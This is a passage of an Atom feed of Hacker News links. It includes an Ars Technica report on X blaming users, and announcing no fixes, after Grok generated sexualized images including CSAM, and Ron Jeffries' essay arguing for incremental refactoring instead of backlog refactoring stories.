&lt;/doc&gt;</content><link href="https://wol.fm/blog/utopian-scholastic.html"/><published>2026-01-05T18:29:28+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46502709</id><title>The meek did inherit the Earth, at least among ants</title><updated>2026-01-05T19:37:50.798472+00:00</updated><content/><link href="https://www.nytimes.com/2025/12/19/science/ants-exoskeletons-weak.html"/><published>2026-01-05T18:33:43+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46502736</id><title>Gatekeepers of Law: Inside the Westlaw and LexisNexis Duopoly</title><updated>2026-01-05T19:37:50.608246+00:00</updated><content/><link href="https://www.thebignewsletter.com/p/gatekeepers-of-law-inside-the-westlaw"/><published>2026-01-05T18:35:17+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46503006</id><title>Pipe Dreams – The life and times of Yahoo Pipes (2023)</title><updated>2026-01-05T19:37:50.300511+00:00</updated><content>&lt;doc fingerprint="fe1ec6fd46491482"&gt;
  &lt;main&gt;
    &lt;p&gt;Table of contents TOC Close Loading...&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://retool.com/pipes"/><published>2026-01-05T18:55:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46503199</id><title>X blames users for Grok-generated CSAM; no fixes announced</title><updated>2026-01-05T19:37:50.085553+00:00</updated><content>&lt;doc fingerprint="ecdd1f785d276a84"&gt;
  &lt;main&gt;
    &lt;p&gt;It seems that instead of updating Grok to prevent outputs of sexualized images of minors, X is planning to purge users generating content that the platform deems illegal, including Grok-generated child sexual abuse material (CSAM).&lt;/p&gt;
    &lt;p&gt;On Saturday, X Safety finally posted an official response after nearly a week of backlash over Grok outputs that sexualized real people without consent. Offering no apology for Grok’s functionality, X Safety blamed users for prompting Grok to produce CSAM while reminding them that such prompts can trigger account suspensions and possible legal consequences.&lt;/p&gt;
    &lt;p&gt;“We take action against illegal content on X, including Child Sexual Abuse Material (CSAM), by removing it, permanently suspending accounts, and working with local governments and law enforcement as necessary,” X Safety said. “Anyone using or prompting Grok to make illegal content will suffer the same consequences as if they upload illegal content.”&lt;/p&gt;
    &lt;p&gt;X Safety’s post boosted a reply on another thread on the platform in which X owner Elon Musk reiterated the consequences users face for inappropriate prompting. That reply came to a post from an X user, DogeDesigner, who suggested that Grok can’t be blamed for “creating inappropriate images,” despite Grok determining its own outputs.&lt;/p&gt;
    &lt;p&gt;“That’s like blaming a pen for writing something bad,” DogeDesigner opined. “A pen doesn’t decide what gets written. The person holding it does. Grok works the same way. What you get depends a lot on what you put in.”&lt;/p&gt;
    &lt;p&gt;But image generators like Grok aren’t forced to output exactly what the user wants, like a pen. One of the reasons the Copyright Office won’t allow AI-generated works to be registered is the lack of human agency in determining what AI image generators spit out. Chatbots are similarly non-deterministic, generating different outputs for the same prompt.&lt;/p&gt;
    &lt;p&gt;That’s why, for many users questioning why X won’t filter out CSAM in response to Grok’s generations, X’s response seems to stop well short of fixing the problem by only holding users responsible for outputs.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arstechnica.com/tech-policy/2026/01/x-blames-users-for-grok-generated-csam-no-fixes-announced/"/><published>2026-01-05T19:07:35+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46503439</id><title>Refactoring – Not on the Backlog (2014)</title><updated>2026-01-05T19:37:49.783622+00:00</updated><content>&lt;doc fingerprint="76a11c736be44578"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Refactoring -- Not on the backlog!&lt;/head&gt;
    &lt;p&gt;There has recently been a lot of noise on the lists, and questions at conferences, about putting refactoring "stories" on the backlog. Even if "technical debt" has grown up, this is invariably an inferior idea. Here's why:&lt;/p&gt;
    &lt;p&gt;When our project begins, the code is clean. The field is well-mowed, life is good, the world's our oyster. Everything is going to be just fine.&lt;/p&gt;
    &lt;p&gt;We can build features smoothly and easily, though we always seem to take a few little twists and turns. Things look pretty clean, and besides, we're in a hurry. We don't notice anything going wrong and we press on rapidly.&lt;/p&gt;
    &lt;p&gt;However, we're letting some brush build up in our nearly perfect field of code. Sometimes people call this "technical debt". It really isn't: it's really just not very good code. But it doesn't look too bad -- yet.&lt;/p&gt;
    &lt;p&gt;As we build, however, we do have to detour around the thickets, or push through them. Generally we detour around.&lt;/p&gt;
    &lt;p&gt;Inevitably, this slows us down a bit. In order to keep going rapidly, we are even less careful than before, and soon more weedy thickets have grown up.&lt;/p&gt;
    &lt;p&gt;These new thickets, on top of the old ones, slow us down even more. We realize there's a problem but we're in too much of a hurry to do anything about it. We press harder to maintain our early velocity.&lt;/p&gt;
    &lt;p&gt;Soon, it seems like half the code we have to work with is burdened with weeds, brush, undergrowth, obstacles of every kind. There might even be some old cans and dirty clothes in there somewhere. Maybe even some pits.&lt;/p&gt;
    &lt;p&gt;Every trip through this messed-up field of code becomes a long trek of dodging through the brush, trying to avoid the pits that have been left behind. Inevitably, we fall into some of these and have to dig our way back out. We're going slower than ever before. Something has to give!&lt;/p&gt;
    &lt;p&gt;The density of problems is very visible to us now, and we see that we can't just take a quick wipe at the field and do ourselves any good. We have a lot of refactoring to do to get back to a clean field. We are tempted to ask for time from our product owner to refactor. Often, that time is not granted: we're asking for time to fix what we screwed up in the past. Not likely anyone is going to cut us any slack on that.&lt;/p&gt;
    &lt;p&gt;If we do get the time, we won't get a very good result. We'll clean up what we see, as well as we can in the time available, which will never be enough. We took many weeks to get the code this bad, and we'll surely not get that many weeks to fix it.&lt;/p&gt;
    &lt;p&gt;This is not the way to go. A big refactoring session is hard to sell, and if sold, it returns less than we hoped, after a long delay. Not a good idea. What should we do?&lt;/p&gt;
    &lt;p&gt;Simples! We take the next feature that we are asked to build, and instead of detouring around all the weeds and bushes, we take the time to clear a path through some of them. Maybe we detour around others. We improve the code where we work, and ignore the code where we don't have to work. We get a nice clean path for some of our work. Odds are, we'll visit this place again: that's how software development works.&lt;/p&gt;
    &lt;p&gt;Maybe this feature takes a little bit longer. Often it doesn't, because the cleanup helps us even with the first feature that passes this way. And of course it'll help any others as well.&lt;/p&gt;
    &lt;p&gt;Rinse, repeat. With each new feature, we clean the code needed by that feature. We invest a little time more than we would if we continued to trash the field, but not much more -- and often less. Especially as the process goes on, we get more and more advantage from our cleanup, and things begin to go faster and faster.&lt;/p&gt;
    &lt;p&gt;Soon, often within the same Sprint where we begin to clean up, we find that a subsequent feature actually uses an area we just previously cleaned. We start to get a benefit from the incremental refactoring right away. Had we waited to do it in a big batch, we'd have put in more effort, delayed any benefits until later still, and likely wasted effort on places that don't provide benefit yet.&lt;/p&gt;
    &lt;p&gt;Work goes better, the code gets cleaner, and we deliver more features than we were able to before. Every one wins.&lt;/p&gt;
    &lt;p&gt;This is how you do it.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ronjeffries.com/xprog/articles/refactoring-not-on-the-backlog/"/><published>2026-01-05T19:23:56+00:00</published></entry></feed>